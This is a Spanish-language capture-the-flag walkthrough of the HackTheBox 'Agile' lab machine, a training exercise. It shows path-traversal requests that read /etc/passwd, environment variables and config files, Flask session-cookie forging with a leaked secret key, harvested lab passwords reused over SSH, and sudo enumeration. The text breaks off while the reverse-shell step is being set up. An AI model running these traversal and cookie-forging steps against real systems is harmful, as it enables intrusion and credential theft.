---
title: HackTheBox - Maquina Agile 
subtitle: Paso a paso de la explotación de la máquina Agile de HackTheBox.
dificultad: Medium
os: Sistema Operativo Linux
date: 2024-02-10
tags:
    - HackTheBox
---

## Enumeración de puertos

### TCP 

Enumeracion de Puertos TCP

~~~ bash
nmap -p- -A 10.129.30.106
Starting Nmap 7.92 ( https://nmap.org ) at 2023-03-06 09:14 EST
Nmap scan report for 10.129.30.106
Host is up (0.15s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 f4:bc:ee:21:d7:1f:1a:a2:65:72:21:2d:5b:a6:f7:00 (ECDSA)
|_  256 65:c1:48:0d:88:cb:b9:75:a0:2c:a5:e6:37:7e:51:06 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://superpass.htb
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 502.76 seconds
~~~



### UDP
  
Enumeración de puertos UDP

~~~ bash
sudo nmap -F -sU 10.129.30.106
[sudo] password for kali: 
Starting Nmap 7.92 ( https://nmap.org ) at 2023-03-06 09:32 EST
Nmap scan report for agile.htb (10.129.30.106)
Host is up (0.15s latency).
Not shown: 99 closed udp ports (port-unreach)
PORT   STATE         SERVICE
68/udp open|filtered dhcpc

Nmap done: 1 IP address (1 host up) scanned in 106.72 seconds
~~~


## Enumeracion de Servicios     

### Puerto 80

Definimos el subdominio superpass.htb (este es visible en el título de la página de Nginx, tambien visible en los resultados de nmap)

![](/Agile/Pasted_image_20230306113515.png)

Intentamos registrarnos en la aplicacion web

![](/Agile/Pasted_image_20230306114025.png)

Al intentarlo obtenemos el siguiente error

![](/Agile/Pasted_image_20230306113616.png)

Luego de registrarnos ingresamos a la siguiente página

Podemos ingresar algunas credenciales al baul.Intentamos exportarlas

Luego intentamos extraer archivos interesantes de información, como el archivo (etc/passwd)

~~~http
GET /download?fn=../../etc/passwd HTTP/1.1
Host: superpass.htb
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: session=.eJwljk1qAzEMha9itA7Fsj1jK6fovoQgyXJmYNqE8WQVcve6dPV4vB--F1zbxn2xDuevF7hjCHxb73wzOMHnZtzNbfebW3_ccXesOkJ3LGt3j9H5gMv7chonu_UFzsf-tOHWCmdolclMov5tsNWk1RsFZNFZLRfzTJVa8T5Q0OgxaFHB1LgIVwokFqcUaKY8kbRM1ihTkjhJZqyKcdaSMZhQRYqoUubSms_JWxLyA__67Lb_06CH9y8M9kfe.ZAX9Ow.fH2yxQcz3IpceX-8l2pwRttG9Uk; remember_token=11|a91ce8f326a4f9f0a8529318e8bb45fb40d8b5747b727b7815fddf9f7d74fd4414370eed6fdcd69074041975f71e52a5cbe305cfc06715ace1b48a7238f3841e
Connection: close
~~~

~~~http
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Mon, 06 Mar 2023 14:51:57 GMT
Content-Type: text/csv; charset=utf-8
Content-Length: 1744
Connection: close
Content-Disposition: attachment; filename=superpass_export.csv
Vary: Cookie

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
usbmux:x:107:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
corum:x:1000:1000:corum:/home/corum:/bin/bash
dnsmasq:x:108:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
mysql:x:109:112:MySQL Server,,,:/nonexistent:/bin/false
runner:x:1001:1001::/app/app-testing/:/bin/sh
edwards:x:1002:1002::/home/edwards:/bin/bash
dev_admin:x:1003:1003::/home/dev_admin:/bin/bash
_laurel:x:999:999::/var/log/laurel:/bin/false
~~~

Consultamos las variables de entorno del sistema

~~~http
GET /download?fn=../../proc/self/environ HTTP/1.1
Host: superpass.htb
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: session=.eJwljk1qAzEMha9itA7Fsj1jK6fovoQgyXJmYNqE8WQVcve6dPV4vB--F1zbxn2xDuevF7hjCHxb73wzOMHnZtzNbfebW3_ccXesOkJ3LGt3j9H5gMv7chonu_UFzsf-tOHWCmdolclMov5tsNWk1RsFZNFZLRfzTJVa8T5Q0OgxaFHB1LgIVwokFqcUaKY8kbRM1ihTkjhJZqyKcdaSMZhQRYqoUubSms_JWxLyA__67Lb_06CH9y8M9kfe.ZAX9Ow.fH2yxQcz3IpceX-8l2pwRttG9Uk; remember_token=11|a91ce8f326a4f9f0a8529318e8bb45fb40d8b5747b727b7815fddf9f7d74fd4414370eed6fdcd69074041975f71e52a5cbe305cfc06715ace1b48a7238f3841e
Connection: close
~~~

![](/Agile/Pasted_image_20230306121100.png)

Buscamos el directorio /app/config_prod.json

~~~http
GET /download?fn=../../home/dev_admin/app/config_prod.json HTTP/1.1
Host: superpass.htb
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: session=.eJwljk1qAzEMha9itA7Fsj1jK6fovoQgyXJmYNqE8WQVcve6dPV4vB--F1zbxn2xDuevF7hjCHxb73wzOMHnZtzNbfebW3_ccXesOkJ3LGt3j9H5gMv7chonu_UFzsf-tOHWCmdolclMov5tsNWk1RsFZNFZLRfzTJVa8T5Q0OgxaFHB1LgIVwokFqcUaKY8kbRM1ihTkjhJZqyKcdaSMZhQRYqoUubSms_JWxLyA__67Lb_06CH9y8M9kfe.ZAX9Ow.fH2yxQcz3IpceX-8l2pwRttG9Uk; remember_token=11|a91ce8f326a4f9f0a8529318e8bb45fb40d8b5747b727b7815fddf9f7d74fd4414370eed6fdcd69074041975f71e52a5cbe305cfc06715ace1b48a7238f3841e
Connection: close
~~~

No tenemos acceso al archivo pero encontramos un campo llamado secret en la respuesta

~~~http
HTTP/1.1 500 INTERNAL SERVER ERROR
Server: nginx/1.18.0 (Ubuntu)
Date: Mon, 06 Mar 2023 15:15:35 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 13637
Connection: close

<!doctype html>
<html lang=en>
  <head>
    <title>PermissionError: [Errno 13] Permission denied: '/tmp/../../home/dev_admin/app/config_prod.json'
 // Werkzeug Debugger</title>
    <link rel="stylesheet" href="?__debugger__=yes&amp;cmd=res&amp;f=style.css">
    <link rel="shortcut icon"
        href="?__debugger__=yes&amp;cmd=res&amp;f=console.png">
    <script src="?__debugger__=yes&amp;cmd=res&amp;f=debugger.js"></script>
    <script>
      var CONSOLE_MODE = false,
          EVALEX = true,
          EVALEX_TRUSTED = false,
          SECRET = "0k71JQ5bp0qM5tHnQe0w";
    </script>
  </head>
~~~

Datos del archivo hosts

~~~http
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Mon, 06 Mar 2023 15:48:03 GMT
Content-Type: text/csv; charset=utf-8
Content-Length: 253
Connection: close
Content-Disposition: attachment; filename=superpass_export.csv
Vary: Cookie

127.0.0.1 localhost superpass.htb test.superpass.htb
127.0.1.1 agile

# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
~~~

Archivo /etc/mysql/my.cnf

~~~http
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Mon, 06 Mar 2023 15:48:05 GMT
Content-Type: text/csv; charset=utf-8
Content-Length: 682
Connection: close
Content-Disposition: attachment; filename=superpass_export.csv
Vary: Cookie

#
# The MySQL database server configuration file.
#
# You can copy this to one of:
# - "/etc/mysql/my.cnf" to set global options,
# - "~/.my.cnf" to set user-specific options.
# 
# One can use all long options that the program supports.
# Run program with --help to get a list of available options and with
# --print-defaults to see which it would actually understand and use.
#
# For explanations see
# http://dev.mysql.com/doc/mysql/en/server-system-variables.html

#
# * IMPORTANT: Additional settings that can override those from this file!
#   The files must end with '.cnf', otherwise they'll be ignored.
#

!includedir /etc/mysql/conf.d/
!includedir /etc/mysql/mysql.conf.d/
~~~

Kernel versión

~~~http
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Mon, 06 Mar 2023 15:48:08 GMT
Content-Type: text/csv; charset=utf-8
Content-Length: 184
Connection: close
Content-Disposition: attachment; filename=superpass_export.csv
Vary: Cookie

Linux version 5.15.0-60-generic (buildd@lcy02-amd64-054) (gcc (Ubuntu 11.3.0-1ubuntu1~22.04) 11.3.0, GNU ld (GNU Binutils for Ubuntu) 2.38) #66-Ubuntu SMP Fri Jan 20 14:29:49 UTC 2023
~~~


Nginx error log

~~~http
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Mon, 06 Mar 2023 15:48:51 GMT
Content-Type: text/csv; charset=utf-8
Content-Length: 82947
Connection: close
Content-Disposition: attachment; filename=superpass_export.csv
Vary: Cookie

2023/02/28 16:21:17 [error] 1004#1004: *14 open() "/app/app/superpass/static/webfonts/josefinsans.ttf" failed (2: No such file or directory), client: 10.10.14.40, server: superpass.htb, request: "GET /static/webfonts/josefinsans.ttf HTTP/1.1", host: "superpass.htb", referrer: "http://superpass.htb/static/css/josefinsans.css"
2023/02/28 16:23:58 [error] 1004#1004: *18 open() "/app/app/superpass/static/webfonts/josefinsans.ttf" failed (2: No such file or directory), client: 10.10.14.40, server: superpass.htb, request: "GET /static/webfonts/josefinsans.ttf HTTP/1.1", host: "superpass.htb", referrer: "http://superpass.htb/static/css/josefinsans.css"

~~~

Consultamos el archivo  /app/config_prod.json

~~~http
GET /download?fn=../../app/config_prod.json HTTP/1.1
Host: superpass.htb
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: session=.eJwljk1qAzEMha9itA7Fsj1jK6fovoQgyXJmYNqE8WQVcve6dPV4vB--F1zbxn2xDuevF7hjCHxb73wzOMHnZtzNbfebW3_ccXesOkJ3LGt3j9H5gMv7chonu_UFzsf-tOHWCmdolclMov5tsNWk1RsFZNFZLRfzTJVa8T5Q0OgxaFHB1LgIVwokFqcUaKY8kbRM1ihTkjhJZqyKcdaSMZhQRYqoUubSms_JWxLyA__67Lb_06CH9y8M9kfe.ZAX9Ow.fH2yxQcz3IpceX-8l2pwRttG9Uk; remember_token=11|a91ce8f326a4f9f0a8529318e8bb45fb40d8b5747b727b7815fddf9f7d74fd4414370eed6fdcd69074041975f71e52a5cbe305cfc06715ace1b48a7238f3841e
Connection: close
~~~

~~~ bash
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Mon, 06 Mar 2023 17:15:30 GMT
Content-Type: text/csv; charset=utf-8
Content-Length: 88
Connection: close
Content-Disposition: attachment; filename=superpass_export.csv
Vary: Cookie

{"SQL_URI": "mysql+pymysql://superpassuser:dSA6l7q*yIVs$39Ml6ywvgK@localhost/superpass"}
~~~

Código fuente de app.py

~~~http
GET /download?fn=../../app/app/superpass/app.py HTTP/1.1
Host: superpass.htb
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: session=.eJwljk1qAzEMha9itA7Fsj1jK6fovoQgyXJmYNqE8WQVcve6dPV4vB--F1zbxn2xDuevF7hjCHxb73wzOMHnZtzNbfebW3_ccXesOkJ3LGt3j9H5gMv7chonu_UFzsf-tOHWCmdolclMov5tsNWk1RsFZNFZLRfzTJVa8T5Q0OgxaFHB1LgIVwokFqcUaKY8kbRM1ihTkjhJZqyKcdaSMZhQRYqoUubSms_JWxLyA__67Lb_06CH9y8M9kfe.ZAX9Ow.fH2yxQcz3IpceX-8l2pwRttG9Uk; remember_token=11|a91ce8f326a4f9f0a8529318e8bb45fb40d8b5747b727b7815fddf9f7d74fd4414370eed6fdcd69074041975f71e52a5cbe305cfc06715ace1b48a7238f3841e
Connection: close
~~~

~~~python

import json
import os
import sys
import flask
import jinja_partials
from flask_login import LoginManager
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))
from superpass.infrastructure.view_modifiers import response
from superpass.data import db_session

app = flask.Flask(__name__)
app.config['SECRET_KEY'] = 'MNOHFl8C4WLc3DQTToeeg8ZT7WpADVhqHHXJ50bPZY6ybYKEr76jNvDfsWD'


def register_blueprints():
    from superpass.views import home_views
    from superpass.views import vault_views
    from superpass.views import account_views
    
    app.register_blueprint(home_views.blueprint)
    app.register_blueprint(vault_views.blueprint)
    app.register_blueprint(account_views.blueprint)


def setup_db():
    db_session.global_init(app.config['SQL_URI'])


def configure_login_manager():
    login_manager = LoginManager()
    login_manager.login_view = 'account.login_get'
    login_manager.init_app(app)

    from superpass.data.user import User

    @login_manager.user_loader
    def load_user(user_id):
        from superpass.services.user_service import get_user_by_id
        return get_user_by_id(user_id)


def configure_template_options():
    jinja_partials.register_extensions(app)
    helpers = {
        'len': len,
        'str': str,
        'type': type,
    }
    app.jinja_env.globals.update(**helpers)


def load_config():
    config_path = os.getenv("CONFIG_PATH")
    with open(config_path, 'r') as f:
        for k, v in json.load(f).items():
            app.config[k] = v


def configure():
    load_config()
    register_blueprints()
    configure_login_manager()
    setup_db()
    configure_template_options()


def enable_debug():
    from werkzeug.debug import DebuggedApplication
    app.wsgi_app = DebuggedApplication(app.wsgi_app, True)
    app.debug = True


def main():
    enable_debug()
    configure()
    app.run(debug=True)


def dev():
    configure()
    app.run(port=5555)


if __name__ == '__main__':
    main()
else:
    configure()

~~~

Usamos el secret_key para extraer la información de la cookie del usuario

Credenciales encontradas

~~~bash
flask-unsign --secret MNOHFl8C4WLc3DQTToeeg8ZT7WpADVhqHHXJ50bPZY6ybYKEr76jNvDfsWD --decode --cookie .eJydjkuKwzAQRK8iem0G_WypfYrZDyF0t1qxwUkGy1mF3H005AZZFUXVo-oJ57pRW7TB_PMEc3SBq7ZGF4UBvjelpma7X8x6M8fdkEgPzbGszfz2zhecXsOH3Gno47u2BeZjf2h3a4EZaiFU5SD_jKslSrGK3hHLJJqyWsKCNVvr0UuwzksWdrFSZirokTWM0eOEaUSuCbViwshh5ESuiAuT5OS8MhaHwQnnKddqU7QaGW2_f3403d9vEF5_-9daSA.ZAYqgQ.Zvh6p_nlvHTv1LtEwEhcdp-rjUo
~~~

~~~python
{'_flashes': [('message', 'Please log in to access this page.'), ('message', 'Please log in to access this page.')], '_fresh': True, '_id': 'fda9eeb3cacce1fd4cd0e921abc6ce78e0a9d9f800292c3012c8cb14fa8bad929be3542969759bf79ef9794b35b7a1dc136c8712eb9d1931cb868ff0740e4b90', '_user_id': '9'}
~~~

Creamos nuestra propia session

~~~python
{'_flashes': [('message', 'Please log in to access this page.'), ('message', 'Please log in to access this page.')], '_fresh': True, '_id': 'fda9eeb3cacce1fd4cd0e921abc6ce78e0a9d9f800292c3012c8cb14fa8bad929be3542969759bf79ef9794b35b7a1dc136c8712eb9d1931cb868ff0740e4b90', '_user_id': '1'}
~~~

El comando a usar es:

~~~bash
flask-unsign --sign --cookie "{'_flashes': [('message', 'Please log in to access this page.'), ('message', 'Please log in to access this page.')], '_fresh': True, '_id': 'fda9eeb3cacce1fd4cd0e921abc6ce78e0a9d9f800292c3012c8cb14fa8bad929be3542969759bf79ef9794b35b7a1dc136c8712eb9d1931cb868ff0740e4b90', '_user_id': '1'}" -S  MNOHFl8C4WLc3DQTToeeg8ZT7WpADVhqHHXJ50bPZY6ybYKEr76jNvDfsWD 
.eJydjkuKwzAQRK8iem0G_WypfYrZDyF0t1qxwUkGy1mF3H005AZZFUXVo-oJ57pRW7TB_PMEc3SBq7ZGF4UBvjelpma7X8x6M8fdkEgPzbGszfz2zhecXsOH3Gno47u2BeZjf2h3a4EZaiFU5SD_jKslSrGK3hHLJJqyWsKCNVvr0UuwzksWdrFSZirokTWM0eOEaUSuCbViwshh5ESuiAuT5OS8MhaHwQnnKddqU7QaGW2_f3403d9vHLz-APu_WkA.ZAYrig.VWDh3LEQeurRSGRbKa66sTMRUPA
~~~

![](/Agile/Pasted_image_20230306150725.png)

Luego lo intentamos con el  \_user_id: 2

![](/Agile/Pasted_image_20230306150956.png)

Users:

~~~bash
corum
runner
edwards
dev_admin
superpassuser
~~~

Passwords:

~~~bash
MNOHFl8C4WLc3DQTToeeg8ZT7WpADVhqHHXJ50bPZY6ybYKEr76jNvDfsWD
dSA6l7q*yIVs$39Ml6ywvgK
0k71JQ5bp0qM5tHnQe0w
~~~

~~~text
0xdf:762b430d32eea2f12970
0xdf:5b133f7a6a1c180646cb
corum:47ed1e73c955de230a1d
corum:9799588839ed0f98c211
corum:5db7caa1d13cc37c9fc2
~~~

## Getting a shell

Intentamos acceder a través de SSH con las credenciales del usuario Corum

~~~ bash
ssh corum@10.129.30.106
~~~

![](/Agile/Pasted_image_20230306155037.png)

### System Enumeration

Procesos interesantes

![](/Agile/Pasted_image_20230306160615.png)

Archivos interesantes

~~~bash
/var/www/html/index.nginx-debian.html                                                                                                                                                 
/app/app-testing/__pycache__/wsgi-dev.cpython-310.pyc
/app/app-testing/tests/functional/creds.txt
/app/app-testing/tests/functional/__pycache__/test_site_interactively.cpython-310-pytest-7.2.0.pyc
/app/app-testing/tests/functional/test_site_interactively.py
/app/app-testing/requirements.txt
/app/app-testing/.pytest_cache/.gitignore
/app/app-testing/.pytest_cache/CACHEDIR.TAG
/app/app-testing/.pytest_cache/v/cache/stepwise
/app/app-testing/.pytest_cache/v/cache/nodeids
/app/app-testing/.pytest_cache/v/cache/lastfailed
/app/app-testing/.pytest_cache/README.md
/app/app-testing/superpass/views/__pycache__/home_views.cpython-310.pyc
/app/app-testing/superpass/views/__pycache__/account_views.cpython-310.pyc
/app/app-testing/superpass/views/__pycache__/vault_views.cpython-310.pyc
/app/app-testing/superpass/views/vault_views.py
/app/app-testing/superpass/views/home_views.py
/app/app-testing/superpass/views/account_views.py
/app/app-testing/superpass/__pycache__/app.cpython-310.pyc
/app/app-testing/superpass/__pycache__/__init__.cpython-310.pyc
~~~

## Privilege Escalation a Edwards

Intentamos acceder al servicio en el puerto 5555, es la misma aplicación pero corriendo como testing y localmente en el sistema Agile

~~~bash
ssh -L 8080:localhost:5555 corum@10.10.11.203
~~~

Nos registramos con un usuario e intentamos acceder a los recursos del sistema, pero no podemos.

Tomamos nuestra cookie y vemos que el id asignado es el 2

~~~bash
flask-unsign --secret MNOHFl8C4WLc3DQTToeeg8ZT7WpADVhqHHXJ50bPZY6ybYKEr76jNvDfsWD --decode --cookie .eJzdkEuKwzAQRK8iem0G_WypfYrZDyF0t1qxwUkGy1mF3H005BZZFUXVg6KecK4btUUbzD9PMEcXuGprdFEY4HtTamq2-8WsN3PcDYn00BzL2sxv73zB6TV8OHca-km7tgXmY39od2uBGWohVOUg_4yrJUqxit4RyySaslrCgjVb69FLsM5LFnaxUmYq6JE1jNHjhGlErgm1YsLIYeRErogLk-TkvDIWh8EJ5ynXalO0Ghltn39-NN3fazy8_gAATZH3.ZAn1Rg.T8uAe8cVXAmBs1AoJY-LcqIjJHc
~~~

~~~json
{'_flashes': [('message', 'Please log in to access this page.'), ('message', 'Please log in to access this page.'), ('message', 'Please log in to access this page.'), ('message', 'Please log in to access this page.'), ('message', 'Please log in to access this page.')], '_fresh': True, '_id': 'fda9eeb3cacce1fd4cd0e921abc6ce78e0a9d9f800292c3012c8cb14fa8bad929be3542969759bf79ef9794b35b7a1dc136c8712eb9d1931cb868ff0740e4b90', '_user_id': '2'}
~~~

Asumimos que la SECRET_KEY es la misma e intentamos crear una sesion con el id 1

~~~bash
flask-unsign --sign --cookie "{'_flashes': [('message', 'Please log in to access this page.'), ('message', 'Please log in to access this page.')], '_fresh': True, '_id': 'fda9eeb3cacce1fd4cd0e921abc6ce78e0a9d9f800292c3012c8cb14fa8bad929be3542969759bf79ef9794b35b7a1dc136c8712eb9d1931cb868ff0740e4b90', '_user_id': '1'}" -S  MNOHFl8C4WLc3DQTToeeg8ZT7WpADVhqHHXJ50bPZY6ybYKEr76jNvDfsWD 
.eJydjkuKwzAQRK8iem0G_WypfYrZDyF0t1qxwUkGy1mF3H005AZZFUXVo-oJ57pRW7TB_PMEc3SBq7ZGF4UBvjelpma7X8x6M8fdkEgPzbGszfz2zhecXsOH3Gno47u2BeZjf2h3a4EZaiFU5SD_jKslSrGK3hHLJJqyWsKCNVvr0UuwzksWdrFSZirokTWM0eOEaUSuCbViwshh5ESuiAuT5OS8MhaHwQnnKddqU7QaGW2_f3403d9vHLz-APu_WkA.ZAYrig.VWDh3LEQeurRSGRbKa66sTMRUPA
~~~

Logramos acceder a las credenciales del usuario edwards

![](/Agile/Pasted_image_20230309120804.png)


Sus datos son:

~~~
edwards:d07867c6267dcb5df0af
dedwards__:7dbfe676b6b564ce5718
~~~

Finalmente ingresamos al sistemas a través de ssh con estas últimas credenciales

![](/Agile/Pasted_image_20230309121717.png)

## User Edwards Enumeration

Verificamos los permisos sudo

~~~
sudo -l
~~~

~~~bash
[sudo] password for edwards: 
Matching Defaults entries for edwards on agile:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User edwards may run the following commands on agile:
    (dev_admin : dev_admin) sudoedit /app/config_test.json
    (dev_admin : dev_admin) sudoedit /app/app-testing/tests/functional/creds.txt

~~~

Con sudoedit podemos modificar un archivo protegido por el administrador

Intentamos acceder al archivo config_test.json

~~~bash
sudo -u dev_admin sudoedit /app/config_test.json
~~~

config_test.json

![](/Agile/Pasted_image_20230309122920.png)

~~~json
{
    "SQL_URI": "mysql+pymysql://superpasstester:VUO8A2c2#3FnLq3*a9DX1U@localhost/superpasstest"
}
~~~

Intentamos acceder al archivo creds.txt

~~~bash
sudo -u dev_admin sudoedit /app/app-testing/tests/functional/creds.txt
~~~

Su cotenido es:

![](/Agile/Pasted_image_20230309122823.png)

~~~
edwards:1d7ffjwrx#$d6qn!9nndqgde4
~~~


Verificamos cuales son los archivos que el usuario web_admin puede modificar 

~~~bash
find /  -user dev_admin 2>/dev/null | xargs ls -al --color
~~~

~~~bash
-rw-r----- 1 dev_admin runner      34 Mar 10 17:18 /app/app-testing/tests/functional/creds.txt
-r--r----- 1 dev_admin www-data    88 Jan 25 00:00 /app/config_prod.json
-r--r----- 1 dev_admin runner      99 Jan 25 15:15 /app/config_test.json
~~~

Verificamos que puede modificar el grupo dev_admin

~~~bash
find /  -group dev_admin 2>/dev/null | xargs ls -al --color
~~~

~~~bash
-rw-r--r-- 1 root      dev_admin 9033 Mar 10 17:21 /app/venv/bin/Activate.ps1
-rw-rw-r-- 1 root      dev_admin 1976 Mar 10 17:21 /app/venv/bin/activate
-rw-r--r-- 1 root      dev_admin  902 Mar 10 17:21 /app/venv/bin/activate.csh
-rw-r--r-- 1 root      dev_admin 2044 Mar 10 17:21 /app/venv/bin/activate.fish

/app/venv:
total 24
drwxrwxr-x 5 root dev_admin 4096 Feb  8 16:29 .
drwxr-xr-x 6 root root      4096 Feb  8 16:29 ..
drwxrwxr-x 2 root dev_admin 4096 Mar 10 17:21 bin
drwxrwxr-x 3 root root      4096 Feb  8 16:29 include
drwxrwxr-x 3 root root      4096 Feb  8 16:29 lib
lrwxrwxrwx 1 root root         3 Jan 25 17:21 lib64 -> lib
-rw-rw-r-- 1 root root        70 Jan 25 17:21 pyvenv.cfg

/app/venv/bin:
total 1380
drwxrwxr-x 2 root dev_admin    4096 Mar 10 17:21 .
drwxrwxr-x 5 root dev_admin    4096 Feb  8 16:29 ..
-rw-r--r-- 1 root dev_admin    9033 Mar 10 17:21 Activate.ps1
-rw-rw-r-- 1 root dev_admin    1976 Mar 10 17:21 activate
-rw-r--r-- 1 root dev_admin     902 Mar 10 17:21 activate.csh
-rw-r--r-- 1 root dev_admin    2044 Mar 10 17:21 activate.fish
-rwxrwxr-x 1 root root          213 Mar 10 17:21 flask
-rwxr-xr-x 1 root root          222 Jan 24 18:06 gunicorn
-rwxrwxr-x 1 root root          226 Mar 10 17:21 pip
-rwxrwxr-x 1 root root          226 Mar 10 17:21 pip3
-rwxrwxr-x 1 root root          226 Mar 10 17:21 pip3.10
-rwxrwxr-x 1 root root          226 Mar 10 17:21 py.test
-rwxrwxr-x 1 root root          226 Mar 10 17:21 pytest
lrwxrwxrwx 1 root root            7 Mar 10 17:21 python -> python3
lrwxrwxrwx 1 root root           16 Mar 10 17:21 python3 -> /usr/bin/python3
lrwxrwxrwx 1 root root            7 Mar 10 17:21 python3.10 -> python3
-rwxrwxr-x 1 root root      1349984 Jan 23 21:45 uwsgi
ls: cannot open directory '/home/dev_admin': Permission denied

~~~

Para comprender mayormente el sistema revisamos el script test_and_update.sh

~~~bash
#!/bin/bash

# update prod with latest from testing constantly assuming tests are passing

echo "Starting test_and_update"
date

# if already running, exit
ps auxww | grep -v "grep" | grep -q "pytest" && exit

echo "Not already running. Starting..."

# start in dev folder
cd /app/app-testing

# system-wide source doesn't seem to happen in cron jobs
source /app/venv/bin/activate

# run tests, exit if failure
pytest -x 2>&1 >/dev/null || exit

# tests good, update prod (flask debug mode will load it instantly)
cp -r superpass /app/app/
echo "Complete!"

~~~

Básicamente lo que hace es validar la aplicación con un conjunto de pruebas, si estas prueabas son aprobadas, la aplicación es copiada en la carpeta /app y pasa a producción. Vemos que el script usa el archivo  /app/venv/bin/activate. Además, el usuario dev_admin tiene permisos de grupo para escribir sobre el.

Intentaremos que el script source /app/venv/bin/activate quede de la siguiente forma (añadimos una shell reversa al final del script)

~~~bash
# This file must be used with "source bin/activate" *from bash*
# you cannot run it directly

deactivate () {
    # reset old environment variables
    if [ -n "${_OLD_VIRTUAL_PATH:-}" ] ; then
        PATH="${_OLD_VIRTUAL_PATH:-}"
        export PATH
        unset _OLD_VIRTUAL_PATH
    fi
    if [ -n "${_OLD_VIRTUAL_PYTHONHOME:-}" ] ; then
        PYTHONHOME="${_OLD_VIRTUAL_PYTHONHOME:-}"
        export PYTHONHOME
        unset _OLD_VIRTUAL_PYTHONHOME
    fi

    # This should detect bash and zsh, which have a hash command that must
    # be called to get it to forget past commands.  Without forgetting
    # past commands the $PATH changes we made may not be respected
    if [ -n "${BASH:-}" -o -n "${ZSH_VERSION:-}" ] ; then
        hash -r 2> /dev/null
    fi

    if [ -n "${_OLD_VIRTUAL_PS1:-}" ] ; then
        PS1="${_OLD_VIRTUAL_PS1:-}"
        export PS1
